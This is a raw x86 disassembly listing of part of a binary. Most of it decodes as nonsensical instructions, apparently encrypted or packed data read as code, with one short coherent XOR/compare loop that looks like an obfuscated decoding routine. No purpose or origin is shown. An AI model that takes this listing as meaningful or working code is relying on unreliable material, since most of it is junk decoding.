  404a09:	fldenv [esp+ebx*8-0x5a]
  404a0d:	aas    
  404a0e:	cmp    esi,ebx
  404a10:	sbb    BYTE PTR [ecx-0x28],0x6b
  404a14:	cmp    eax,0x60839960
  404a19:	pop    edx
  404a1a:	daa    
  404a1b:	pop    es
  404a1c:	or     dh,ch
  404a1e:	xchg   edx,eax
  404a1f:	mov    esp,0x35e1b300
  404a24:	jmp    0x38162f4e
  404a29:	dec    esp
  404a2a:	(bad)  
  404a2b:	sahf   
  404a2c:	adc    BYTE PTR [edx+0x15],dh
  404a2f:	xor    edi,DWORD PTR [edi+edi*4-0x5bafcee4]
  404a36:	jl     0x4049e6
  404a38:	out    0x2,al
  404a3a:	push   0xc53dfda3
  404a3f:	bound  edi,QWORD PTR [ecx+0x43]
  404a42:	jns    0x4049e6
  404a44:	ja     0x404a8c
  404a46:	scas   eax,DWORD PTR es:[edi]
  404a47:	(bad)  
  404a48:	sub    DWORD PTR [esi-0x3f7b9328],ebp
  404a4e:	mov    al,0xfc
  404a50:	fadd   DWORD PTR [ebx-0x780aca59]
  404a56:	inc    edx
  404a57:	out    0xcb,al
  404a59:	xor    BYTE PTR [ebp-0x57],cl
  404a5c:	sbb    eax,0x960c511b
  404a61:	mov    edx,0x93f23c89
  404a66:	cwde   
  404a67:	jle    0x404a05
  404a69:	cmp    DWORD PTR [esi-0x2284f8ea],edx
  404a6f:	sar    DWORD PTR [edi-0x1ca8268f],0x8a
  404a76:	xor    eax,edi
  404a78:	fidiv  WORD PTR [ebx-0x4a12dbbf]
  404a7e:	rol    BYTE PTR [edx+0x40],0xa8
  404a82:	cmp    BYTE PTR [esi],ch
  404a84:	xchg   edx,eax
  404a85:	fimul  WORD PTR [esi+0x22]
  404a88:	xor    esi,DWORD PTR [eax-0x7ba57f9e]
  404a8e:	(bad)
  404a92:	dec    ecx
  404a93:	out    0xa8,al
  404a95:	mov    ss,eax
  404a97:	loope  0x404a55
  404a99:	mov    WORD PTR [eax],fs
  404a9b:	push   0xd8bd4bf5
  404aa0:	add    BYTE PTR [esi],dh
  404aa2:	sub    dh,ch
  404aa4:	sbb    al,0xba
  404aa6:	or     BYTE PTR [edi+ebx*8+0x12],cl
  404aaa:	lock fadd st,st(2)
  404aad:	repnz sti 
  404aaf:	stos   WORD PTR es:[edi],ax
  404ab1:	bound  esi,QWORD PTR [ebx]
  404ab3:	sub    eax,eax
  404ab5:	in     al,dx
  404ab6:	fcmove st,st(6)
  404ab8:	mov    esp,0x1cc4d467
  404abd:	imul   esi,DWORD PTR [ebx],0x6c
  404ac0:	int3   
  404ac1:	out    0xc3,eax
  404ac3:	mov    esi,0x1fa221b
  404ac8:	fsubr  QWORD PTR [ebx]
  404aca:	pop    edi
  404acb:	adc    BYTE PTR [esi+ecx*4+0x75],0x67
  404ad0:	jae    0x404ab9
  404ad2:	aas    
  404ad3:	pop    es
  404ad4:	jne    0x404aee
  404ad6:	mov    DWORD PTR [edx+0x4291729e],esi
  404adc:	mov    dl,0xaf
  404ade:	xchg   ebx,eax
  404adf:	popa   
  404ae0:	jns    0x404aae
  404ae2:	mov    ebp,0x9bdc2b10
  404ae7:	aad    0x0
  404ae9:	cli    
  404aea:	rol    esp,0x24
  404aed:	jne    0x404b1e
  404aef:	test   al,0x91
  404af1:	lods   al,BYTE PTR ds:[esi]
  404af2:	xchg   DWORD PTR [esi],edi
  404af4:	mov    ds:0x1d6295d4,eax
  404af9:	pop    edi
  404afa:	or     dh,ch
  404afc:	push   ds
  404afd:	inc    ebx
  404afe:	retf   
  404aff:	jns    0x404b10
  404b01:	rcl    al,cl
  404b03:	das    
  404b04:	cmp    DWORD PTR [edi],ebx
  404b06:	ins    BYTE PTR es:[edi],dx
  404b07:	sub    ch,BYTE PTR [eax]
  404b09:	mov    ecx,0xb1d193d6
  404b0e:	and    DWORD PTR [ebx+0x95d696f],esp
  404b14:	cmp    BYTE PTR [esi+0xd],cl
  404b17:	inc    ecx
  404b18:	shr    BYTE PTR [ebx],cl
  404b1a:	pop    ss
  404b1b:	xchg   ecx,eax
  404b1c:	enter  0x5912,0x84
  404b20:	not    DWORD PTR [eax]
  404b22:	pop    ss
  404b23:	je     0x404abd
  404b25:	fisttp DWORD PTR [edi+0x4f7d8b4f]
  404b2b:	sbb    esi,DWORD PTR [ebx+0x35fe10f8]
  404b31:	or     BYTE PTR [esi],cl
  404b33:	xor    eax,ebx
  404b35:	popf   
  404b36:	mov    ds:0x3a396da1,al
  404b3b:	jle    0x404ac1
  404b3d:	mov    al,ds:0x6de4197c
  404b42:	(bad)  cs:[ecx]
  404b45:	jecxz  0x404b62
  404b47:	push   cs
  404b48:	xchg   esp,eax
  404b49:	sub    edi,ebx
  404b4b:	shr    BYTE PTR [ecx+esi*2-0x35dee7a9],0xf6
  404b53:	mov    al,ds:0x2fc8c50e
  404b58:	inc    ebx
  404b59:	push   0x3d
  404b5b:	in     eax,0x5c
  404b5d:	pop    es
  404b5e:	xor    al,0xde
  404b60:	call   0xcbdc75cc
  404b65:	int3   
  404b66:	fisttp WORD PTR [edx+0x1abca8a1]
  404b6c:	sti    
  404b6d:	test   DWORD PTR [ebx+esi*8],esp
  404b70:	jmp    FWORD PTR ds:0x6e2b4575
  404b76:	mov    dl,0x38
  404b78:	(bad)  
  404b79:	fnstsw WORD PTR ds:0x1d279b22
  404b7f:	mov    DWORD PTR [esi+ecx*8-0x12],0x2442a863
  404b87:	jl     0x404b54
  404b89:	mov    gs,edx
  404b8b:	mov    ebx,ecx
  404b8d:	je     0x404bf4
  404b8f:	and    bl,bl
  404b91:	(bad)  
  404b92:	xor    al,BYTE PTR [edx+0x77]
  404b95:	aas    
  404b96:	push   0xbde6e4d8
  404b9b:	cmp    BYTE PTR [ebx],ah
  404b9d:	xchg   ebp,eax
  404b9e:	call   0x1fae322c
  404ba3:	in     al,dx
  404ba4:	(bad)  
  404ba5:	and    DWORD PTR [edi+edi*2],eax
  404ba8:	aam    0xf9
  404baa:	aad    0x72
  404bac:	xchg   BYTE PTR [esi-0x33],ch
  404baf:	fcom   DWORD PTR [ebx-0x57]
  404bb2:	adc    esi,DWORD PTR [ebx+0x3a]
  404bb5:	mov    al,0xec
  404bb7:	add    esi,eax
  404bb9:	aad    0xd2
  404bbb:	pop    esi
  404bbc:	mov    esi,0x5174db65
  404bc1:	dec    edx
  404bc2:	loopne 0x404bc1
  404bc4:	popa   
  404bc5:	cld    
  404bc6:	dec    ebx
  404bc7:	pop    esp
  404bc8:	mov    esi,0x7b9f4aa0
  404bcd:	popf   
  404bce:	jle    0x404bbc
  404bd0:	(bad)  
  404bd2:	cmovg  ebp,DWORD PTR [ebp-0x3a]
  404bd6:	jg     0x404bf0
  404bd8:	ds xor ah,ah
  404bdb:	cmp    eax,DWORD PTR [ecx]
  404bdd:	sub    edi,DWORD PTR [ebx]
  404bdf:	or     bl,BYTE PTR [esi+esi*1-0x60]
  404be3:	ret    0x86f9
  404be6:	jl     0x404b90
  404be8:	lods   al,BYTE PTR ds:[esi]
  404be9:	imul   eax,DWORD PTR [esi],0xffffffda
  404bec:	test   edi,ebx
  404bee:	mov    edi,0x892a5271
  404bf3:	dec    ebx
  404bf4:	push   ds
  404bf5:	scas   al,BYTE PTR es:[edi]
  404bf6:	lea    ebx,[ebx-0x80]
  404bf9:	mov    al,0x96
  404bfb:	dec    edx
  404bfc:	mov    ds:0x1ff050e5,al
  404c01:	mov    al,BYTE PTR [esi+0x5]
  404c04:	mov    al,BYTE PTR [eax]
  404c06:	mov    ecx,0x123a8a5e
  404c0b:	adc    eax,0xcd941358
  404c10:	xor    esp,DWORD PTR [esi-0x7d893ef]
  404c16:	sbb    edi,DWORD PTR [eax]
  404c18:	(bad)  
  404c19:	jge    0x404c6e
  404c1b:	or     BYTE PTR [eax-0x14],cl
  404c1e:	pop    esi
  404c1f:	js     0x404c65
  404c21:	sar    BYTE PTR [esp+edx*4],0x92
  404c25:	fcomp  st(5)
  404c27:	imul   BYTE PTR [ecx+0x1da11c22]
  404c2d:	pop    ecx
  404c2e:	daa    
  404c2f:	scas   al,BYTE PTR es:[edi]
  404c30:	inc    edx
  404c31:	pusha  
  404c32:	fmul   QWORD PTR es:[ebx]
  404c35:	ffreep st(3)
  404c37:	and    al,0x3c
  404c39:	dec    ebx
  404c3a:	iret   
  404c3b:	in     al,0x47
  404c3d:	pusha  
  404c3e:	jl     0x404c8f
  404c40:	jnp    0x404bdf
  404c42:	rcl    BYTE PTR [eax-0x4d4f4f4b],cl
  404c48:	xor    bl,bl
  404c4a:	jg     0x404c90
  404c4c:	add    eax,0x49b1fb7f
  404c51:	push   edx
  404c52:	loop   0x404c8a
  404c54:	shl    DWORD PTR [eax],1
  404c56:	add    BYTE PTR [edx],0x27
  404c59:	loopne 0x404c9f
  404c5b:	push   ds
  404c5c:	ss cwde 
  404c5e:	add    al,0x84
  404c60:	and    DWORD PTR [edi-0x3d],0xffffff9f
  404c64:	and    eax,DWORD PTR [edx]
  404c66:	jmp    0x2876:0x8d19a42f
  404c6d:	jae    0x404c51
  404c6f:	out    0x7c,eax
  404c71:	mov    ch,0x30
  404c73:	and    DWORD PTR [ebp+0x1537967c],esi
  404c79:	dec    ebx
  404c7a:	or     ecx,DWORD PTR [eax]
  404c7c:	pop    esp
  404c7d:	dec    edi
  404c7e:	out    0x4,al
  404c80:	inc    esi
  404c81:	or     DWORD PTR [edi-0x61fd4552],0xe60453c1
  404c8b:	outs   dx,BYTE PTR ds:[esi]
  404c8c:	out    dx,al
  404c8d:	sub    BYTE PTR [edx-0xa],dl
  404c90:	(bad)  
  404c91:	xchg   BYTE PTR [ebx],dh
  404c93:	leave  
  404c94:	cmp    al,ch
  404c96:	(bad)  
  404c97:	or     al,0x81
  404c99:	and    DWORD PTR [ebx],eax
  404c9b:	pop    esi
  404c9c:	(bad)  
  404c9d:	jbe    0x404c1f
  404c9f:	neg    DWORD PTR [edi-0x6c3058e6]
  404ca5:	dec    edi
  404ca6:	dec    edi
  404ca7:	mov    esi,0xaa2c31d8
  404cac:	outs   dx,DWORD PTR cs:[esi]
  404cae:	mov    ebp,DWORD PTR cs:[esi-0x3d04293c]
  404cb5:	cmp    eax,0x5abe4061
  404cba:	and    ebp,DWORD PTR [eax-0x63]
  404cbd:	dec    esp
  404cbe:	jbe    0x404d07
  404cc0:	xchg   ebx,eax
  404cc1:	mov    edi,0x646f8f2c
  404cc6:	aam    0xae
  404cc8:	addr16 adc esi,esi
  404ccb:	push   cs
  404ccc:	pop    ds
  404ccd:	test   al,0xbe
  404ccf:	pop    esi
  404cd0:	cmc    
  404cd1:	and    al,0x1
  404cd3:	or     DWORD PTR [esi],esi
  404cd5:	lock shl DWORD PTR [di],1
  404cd9:	clc    
  404cda:	ror    BYTE PTR [esi+esi*4-0x644eb271],0xf9
  404ce2:	sbb    DWORD PTR [ebp+0x16],esi
  404ce5:	sbb    al,0x63
  404ce7:	sbb    edx,DWORD PTR [edx+0x49]
  404cea:	rcl    DWORD PTR [ebx],cl
  404cec:	std    
  404ced:	dec    ebx
  404cee:	add    eax,0xe61e961e
  404cf3:	fwait
  404cf4:	push   ss
  404cf5:	lods   eax,DWORD PTR ds:[esi]
  404cf6:	daa    
  404cf7:	mov    cl,0x21
  404cf9:	mov    ss,WORD PTR [esi+0xa]
  404cfc:	mov    ebx,0xe7f36c9a
  404d01:	lods   eax,DWORD PTR ds:[esi]
  404d02:	or     eax,0xc21bdebc
  404d07:	xchg   ebp,eax
  404d08:	pop    esi
  404d09:	jno    0x404d0e
  404d0b:	mov    edi,0x42e6ff05
  404d11:	add    BYTE PTR [eax+0xe],bl
  404d14:	add    BYTE PTR [eax],al
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e6eb,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax+0x6b]
  404d39:	test   BYTE PTR [ecx+0x702e9690],bl
  404d3f:	jo     0x404d7e
  404d41:	jge    0x404db3
  404d43:	jo     0x404d45
  404d45:	sti    
  404d46:	cmp    edx,DWORD PTR [ebx-0x6d]
  404d49:	add    BYTE PTR [ebx],dh
  404d4b:	shl    DWORD PTR [edx+edi*2+0x158abecc],1
  404d52:	lds    edx,FWORD PTR [edx-0x78ad1aef]
  404d58:	mov    cs,WORD PTR [edx]
  404d5a:	dec    esp
  404d5b:	fldenv ds:0xe4a76ba7
  404d61:	call   0xab6ebd86
  404d66:	adc    ebx,DWORD PTR [eax+0x58]
  404d69:	iret   
  404d6a:	cmp    ebx,DWORD PTR [ecx-0x25]
  404d6d:	sets   BYTE PTR [esi+ebx*1+0x367beebf]
  404d75:	inc    esi
  404d76:	add    eax,DWORD PTR [edi-0x8]
  404d79:	and    al,0xc1
  404d7b:	dec    ebx
  404d7c:	(bad)  
  404d7d:	xor    DWORD PTR [ecx+0x3d87e965],esi
  404d83:	pop    eax
  404d84:	and    DWORD PTR [ebp-0x134e5b9a],0xffffff8e
  404d8b:	lea    esi,[edi]
  404d8d:	mov    al,0xe7
  404d8f:	sbb    ah,BYTE PTR [edi+0x21]
  404d92:	push   edx
  404d93:	inc    esi
  404d94:	mov    edi,0xa2dc8499
  404d99:	sbb    al,BYTE PTR [edx-0x49188771]
  404d9f:	sub    BYTE PTR [edi+0x1a87d99d],ah
  404da5:	add    eax,DWORD PTR [ebp+0x67]
  404da8:	neg    DWORD PTR [esi-0x5a526c68]
  404dae:	xor    dh,BYTE PTR [ebp-0x2fe9451b]
  404db4:	leave  
  404db5:	push   ecx
  404db6:	push   0x57
  404db8:	call   0x5105433b
  404dbd:	mov    ds:0x773d1e70,eax
  404dc2:	jmp    0x7b955fd4
  404dc7:	lock or DWORD PTR [esi],0xfffffff0
  404dcb:	js     0x404ddb
  404dcd:	loop   0x404e10
  404dcf:	and    al,0x3
  404dd1:	into   
  404dd2:	es (bad) 
  404dd4:	retf   0x45a2
  404dd7:	dec    edx
  404dd8:	xchg   edx,eax
  404dd9:	xchg   ebp,eax
  404dda:	inc    ebp
  404ddb:	dec    ecx
  404ddc:	push   ebx
  404ddd:	jbe    0x404d82
  404ddf:	lds    ebx,FWORD PTR [ebx-0x6907be2a]
  404de5:	push   esi
  404de6:	mul    ah
  404de8:	loopne 0x404db0
  404dea:	repnz xor edi,DWORD PTR ds:0xa34e1f9e
  404df1:	sub    edx,DWORD PTR [eax+ebp*8-0x127dea69]
  404df8:	dec    edx
  404df9:	ins    DWORD PTR es:[edi],dx
  404dfa:	popa   
  404dfb:	fadd   QWORD PTR [ebp-0x3d]
  404dfe:	aas    
  404dff:	and    ebp,DWORD PTR [edi-0x4ad7778e]
  404e05:	mov    ch,0x37
  404e07:	sub    DWORD PTR [ecx-0x5bfb6c0c],esi
  404e0d:	pop    ecx
  404e0f:	jmp    0x404e0a
  404e11:	inc    esp
  404e12:	fcmovbe st,st(2)
  404e14:	mov    ds:0xddd0c80e,al
  404e19:	pushf  
  404e1a:	push   esp
  404e1b:	mov    ch,0xd
  404e1d:	add    DWORD PTR [esi+0x39],edx
  404e20:	xor    bl,bh
  404e22:	ret    
  404e23:	sbb    edi,esp
  404e25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e26:	jmp    0x404e80
  404e28:	cdq    
  404e29:	fcomp  QWORD PTR [esi+0x29]
  404e2c:	lea    edi,[ecx-0x7a]
  404e2f:	xor    eax,0xb5d719f3
  404e34:	stos   DWORD PTR es:[edi],eax
  404e35:	mov    bh,0xe0
  404e37:	inc    esp
  404e38:	xchg   ebx,eax
  404e39:	mov    ebx,0xb6d0fa9b
  404e3e:	jmp    0xa2d9:0x783c0bb
  404e45:	cwde   
  404e46:	imul   BYTE PTR [edi]
  404e48:	add    ebp,DWORD PTR ds:0x62f3c173
  404e4e:	fnsave ds:0xd0401446
  404e54:	sbb    edx,DWORD PTR [esi-0x51]
  404e57:	xchg   al,dh
  404e59:	icebp  
  404e5a:	lea    ebp,[eax]
  404e5c:	sbb    eax,0x5c696234
  404e61:	lea    ebx,[edi-0x4c]
  404e64:	or     eax,0x68e83e1e
  404e69:	sar    BYTE PTR [edx+0x43c5a21d],cl
  404e6f:	push   ecx
  404e70:	or     BYTE PTR [ecx-0x3f],dh
  404e73:	jg     0x404eb7
  404e75:	add    al,0x3d
  404e77:	ror    DWORD PTR [edi],0x31
  404e7a:	add    ch,BYTE PTR [esi-0x38]
  404e7d:	fwait
  404e7e:	repnz dec ebx
  404e80:	add    BYTE PTR [edi+0x67],dh
  404e83:	or     BYTE PTR [edx+0x7a],ch
  404e86:	imul   edi,DWORD PTR [esi+0x60],0x84954bea
  404e8d:	das    
  404e8e:	mov    eax,0x13b64476
  404e93:	cwde   
  404e94:	fs ss int 0xd0
  404e98:	or     eax,0xf4696b3e
  404e9d:	cli    
  404e9e:	add    esp,DWORD PTR [esp+ebx*4+0x35]
  404ea2:	fcmovb st,st(1)
  404ea4:	mov    bh,0x3d
  404ea6:	xchg   ebp,eax
  404ea7:	imul   esi,DWORD PTR [edi],0xffffffd1
  404eaa:	add    BYTE PTR [ecx+0x3b],bl
  404ead:	add    al,0x5a
  404eaf:	out    0xd6,al
  404eb1:	neg    BYTE PTR [ebp-0xd2c57ab]
  404eb7:	sub    ch,0xd7
  404eba:	push   es
  404ebb:	rcl    DWORD PTR [ebx+0x61a68f1c],1
  404ec1:	stc    
  404ec2:	sbb    ecx,DWORD PTR [ebx-0x64154bcf]
  404ec8:	dec    edx
  404ec9:	fcomp  DWORD PTR [edi]
  404ecb:	xchg   ebp,eax
  404ecc:	popf   
  404ecd:	dec    esi
  404ece:	xchg   ebx,eax
  404ecf:	xchg   ebp,edx
  404ed1:	mov    dh,0x45
  404ed3:	mov    eax,DWORD PTR [edx-0x2]
  404ed6:	loope  0x404ea5
  404ed8:	popf   
  404ed9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404eda:	sbb    DWORD PTR [ebx-0x1cec05a6],edi
  404ee0:	cmc    
  404ee1:	sahf   
  404ee2:	xor    al,0x27
  404ee4:	cmp    al,0x26
  404ee6:	pop    ebx
  404ee7:	dec    esi
  404ee8:	lods   eax,DWORD PTR ds:[esi]
  404ee9:	push   ebp
  404eea:	fwait
  404eeb:	push   0xffffffbf
  404eed:	add    DWORD PTR [ebx+0x446264cb],ebx
  404ef3:	jb     0x404e76
  404ef5:	aam    0xfc
  404ef7:	in     eax,0x59
  404ef9:	mov    edx,0xbb38df84
  404efe:	sbb    edx,DWORD PTR [eax+0x5ac8b56c]
  404f04:	dec    edi
  404f05:	sbb    ecx,DWORD PTR [esi-0x67]
  404f08:	or     eax,0x2aab4aad
  404f0d:	dec    esp
  404f0e:	fsub   QWORD PTR [edi]
  404f10:	test   al,0x4a
  404f12:	stos   BYTE PTR es:[edi],al
  404f13:	ja     0x404f6d
  404f15:	push   es
  404f16:	mov    ch,0xe5
  404f18:	stos   DWORD PTR es:[edi],eax
  404f19:	ror    BYTE PTR [esi],cl
  404f1b:	xchg   ebp,eax
  404f1c:	pop    esi
  404f1d:	dec    edi
  404f1e:	add    al,0xbe
  404f20:	int    0xd0
  404f22:	adc    BYTE PTR [esi+0xb5fe6f9],0x33
  404f29:	cmp    BYTE PTR [ebx-0x6897f039],0x1c
  404f30:	push   es
  404f31:	mov    cl,0x19
  404f33:	nop
  404f34:	sub    al,0x7c
  404f36:	pop    ss
  404f37:	mov    edx,0x43894707
  404f3c:	outs   dx,DWORD PTR ds:[esi]
  404f3d:	adc    al,0xfe
  404f3f:	addr16 pusha 
  404f41:	jnp    0x404f9c
  404f43:	push   eax
  404f44:	sbb    BYTE PTR [edi+0x9],dh
  404f47:	xchg   edx,eax
  404f48:	cs es xchg esp,eax
  404f4b:	je     0x404ed7
  404f4d:	jge    0x404fac
  404f4f:	mov    esi,0x1f99eec9
  404f54:	xchg   BYTE PTR [eax+ecx*1+0x2e32fe41],bh
  404f5b:	pop    ds
  404f5c:	std    
  404f5d:	cdq    
  404f5e:	repnz inc edi
  404f60:	retf   
  404f61:	adc    BYTE PTR [edi+edx*8-0x24],dh
  404f65:	and    DWORD PTR [ecx],ecx
  404f67:	xchg   ecx,eax
  404f68:	inc    ebp
  404f69:	pusha  
  404f6a:	mov    ch,0xda
  404f6c:	sub    esi,esi
  404f6e:	mov    ah,0x75
  404f70:	sbb    eax,edx
  404f72:	and    al,0x28
  404f74:	jecxz  0x404f99
  404f76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f78:	cli    
  404f79:	jmp    0xdc206dc
  404f7e:	and    BYTE PTR [edi],dl
  404f80:	sbb    al,0xe0
  404f82:	enter  0xa54d,0x59
  404f86:	test   eax,esi
  404f88:	add    dl,BYTE PTR [ebx-0x55]
  404f8b:	and    WORD PTR [edx+0xa],ax
  404f8f:	cmp    bl,BYTE PTR [ecx-0x6582db0b]
  404f95:	ja     0x404fc8
  404f97:	mov    cl,0x1
  404f99:	dec    ebp
  404f9a:	aad    0xc9
  404f9c:	jle    0x404fdc
  404f9e:	fcom   st(4)
  404fa0:	xor    eax,0x4dd9ef34
  404fa5:	daa    
  404fa6:	xor    ebp,edx
  404fa8:	scas   eax,DWORD PTR es:[edi]
  404fa9:	lods   eax,DWORD PTR ds:[esi]
  404faa:	push   ecx
  404fab:	std    
  404fac:	add    al,0x81
  404fae:	cmc    
  404faf:	push   edx
  404fb0:	mov    bh,0xd6
  404fb2:	and    al,0x20
  404fb4:	in     al,dx
  404fb5:	fcmovnbe st,st(0)
  404fb7:	add    ebp,eax
  404fb9:	popf   
  404fba:	push   edi
  404fbb:	sub    BYTE PTR [eax+0x4bfda31b],dh
  404fc1:	jge    0x405012
  404fc3:	jb     0x404f71
  404fc5:	jne    0x404f72
  404fc7:	int    0xb
  404fc9:	jmp    0xdc275611
  404fce:	rcl    dl,cl
  404fd0:	adc    ch,BYTE PTR [ebx-0x58162bcf]
  404fd6:	(bad)  
  404fd7:	(bad)  
  404fd9:	fst    QWORD PTR [ebp+0x1]
  404fdc:	(bad)  
  404fdd:	out    0x64,al
  404fdf:	sbb    eax,0xf3c110da
  404fe4:	fadd   QWORD PTR [esi]
  404fe6:	jg     0x404fbb
  404fe8:	adc    eax,0xb3468b7c
  404fed:	mov    fs,WORD PTR [eax]
  404fef:	add    DWORD PTR [esi-0x16],ebx
  404ff2:	aaa    
  404ff3:	jno    0x404fc1
  404ff5:	add    cl,al
  404ff7:	in     eax,dx
  404ff8:	int    0xf3
  404ffa:	jp     0x405035
  404ffc:	xchg   edx,eax
  404ffd:	cmc    
  404ffe:	lods   al,BYTE PTR ds:[esi]
  404fff:	cmp    al,0xf1
  405001:	jl     0x404fae
  405003:	imul   ebx,DWORD PTR [edx],0xad4d870f
  405009:	push   DWORD PTR [esi]
  40500b:	push   ebx
  40500c:	push   edi
  40500d:	sbb    eax,0xb11d04e3
  405012:	sub    eax,0xe84fddc4
  405018:	mov    ecx,DWORD PTR [eax]
  40501a:	cs enter 0xb5f7,0xd6
  40501f:	and    al,0x67
  405021:	jbe    0x40502c
  405023:	mov    DWORD PTR [edi],ecx
  405025:	push   eax
  405026:	in     eax,dx
  405027:	add    esp,DWORD PTR [esi-0x17]
  40502a:	aad    0x1a
  40502c:	pusha  
  40502d:	(bad)  
  40502e:	xor    bh,BYTE PTR [ebp+0x5c]
  405031:	ficom  DWORD PTR [esi+0x2783a926]
  405037:	mov    edi,0x804e169a
  40503d:	push   0x486f554f
  405042:	retf   
  405043:	cmp    eax,0x28565bcb
  405048:	es ret 
  40504a:	retf   0x394d
  40504d:	add    BYTE PTR [ebx+0x271b6b6d],al
  405053:	test   DWORD PTR [esi],edx
  405055:	stc    
  405056:	ins    DWORD PTR es:[edi],dx
  405057:	adc    eax,0x89e0646b
  40505c:	inc    ebp
  40505d:	push   ebp
  40505e:	int    0x19
  405060:	mov    eax,ds:0x25906e4d
  405065:	jae    0x40504d
  405067:	lahf   
  405068:	xchg   BYTE PTR [edi],bh
  40506a:	ds push esi
  40506c:	and    ebx,DWORD PTR [edi+0x5a]
  40506f:	shl    BYTE PTR [ecx+ecx*8-0xc0f5d49],0xe8
  405077:	(bad)  
  405078:	xlat   BYTE PTR ds:[ebx]
  405079:	xor    esi,DWORD PTR [ecx-0x61]
  40507c:	xchg   BYTE PTR [esi-0x4f54e363],bh
  405082:	inc    eax
  405083:	xchg   edx,eax
  405084:	and    dh,BYTE PTR [edi]
  405086:	call   0x43349616
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	ror    DWORD PTR [ebx+0x53dedde0],0x2b
  405137:	jo     0x4051a9
  405139:	cmp    eax,0x370707d
  40513e:	pop    eax
  40513f:	sahf   
  405140:	pop    ds
  405141:	add    al,0x8e
  405143:	push   0x19
  405145:	jnp    0x405121
  405147:	and    al,0x3b
  405149:	add    al,0x33
  40514b:	popf   
  40514c:	outs   dx,BYTE PTR ds:[esi]
  40514d:	xchg   edx,esi
  40514f:	mov    ecx,DWORD PTR [edx+0x30f383fd]
  405155:	cmp    DWORD PTR [ebx+0x6b],eax
  405158:	(bad)  
  405159:	pop    edx
  40515a:	sbb    ch,ch
  40515c:	adc    eax,edi
  40515e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40515f:	push   0x73
  405161:	and    BYTE PTR [esi-0x30c3316c],dl
  405167:	das    
  405168:	inc    ebp
  405169:	(bad)  
  40516a:	sub    esi,DWORD PTR [eax+0x51]
  40516d:	ret    
  40516e:	test   BYTE PTR [eax],al
  405170:	push   ebp
  405171:	dec    ecx
  405172:	or     DWORD PTR [ebx-0x5e2ae515],0x53
  405179:	cs out 0x99,al
  40517c:	add    al,0xf8
  40517e:	lods   al,BYTE PTR ds:[esi]
  40517f:	sbb    al,0xc3
  405181:	mov    ds:0xd5b62d10,al
  405186:	pushf  
  405187:	aaa    
  405188:	lods   eax,DWORD PTR ds:[esi]
  405189:	repnz int3 
  40518b:	daa    
  40518c:	rdtsc  
  40518e:	lea    ecx,[esi+0x3a779827]
  405194:	adc    al,0xd8
  405196:	dec    eax
  405197:	dec    ebp
  405198:	xor    dh,dl
  40519a:	xlat   BYTE PTR ds:[ebx]
  40519b:	jnp    0x4051f0
  40519d:	mov    al,ds:0x1cfd4177
  4051a2:	mov    DWORD PTR [ebp+0x24],edx
  4051a5:	popa   
  4051a6:	push   eax
  4051a7:	and    ah,BYTE PTR [edx-0x53322e1c]
  4051ad:	jle    0x4051ac
  4051af:	push   ecx
  4051b0:	xchg   ebx,eax
  4051b1:	dec    esp
  4051b2:	(bad)  
  4051b3:	fucompp 
  4051b5:	js     0x4051a3
  4051b7:	adc    BYTE PTR [ebp-0x76],cl
  4051ba:	push   0x61
  4051bc:	inc    esi
  4051bd:	loopne 0x40513f
  4051bf:	lock fdiv DWORD PTR [ebx-0x5990a51e]
  4051c6:	dec    edx
  4051c7:	pop    ds
  4051c8:	xchg   esp,eax
  4051c9:	xchg   edi,eax
  4051ca:	sar    DWORD PTR [ecx+0x1fdd77e4],1
  4051d0:	push   cs
  4051d1:	pop    ebp
  4051d2:	and    edi,DWORD PTR [ecx+0x613c437e]
